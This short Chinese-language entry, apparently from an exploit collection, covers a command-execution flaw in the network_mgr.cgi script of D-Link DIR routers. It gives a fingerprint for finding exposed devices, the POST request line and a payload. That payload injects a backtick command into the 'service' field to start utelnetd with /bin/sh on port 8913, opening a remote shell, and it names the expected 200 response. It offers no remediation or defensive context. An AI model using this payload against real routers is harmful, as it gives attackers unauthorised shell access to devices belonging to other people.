# D-Linknetwork_mgr.cgi存在命令执行漏洞

D-Linknetwork_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/network\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=cgi\_portforwarding\_add\&service=`utelnetd -p 8913 -l /bin/sh`\&e\_port=\&p\_port=\&protocol=\&enable=1
```
- **响应特征**：200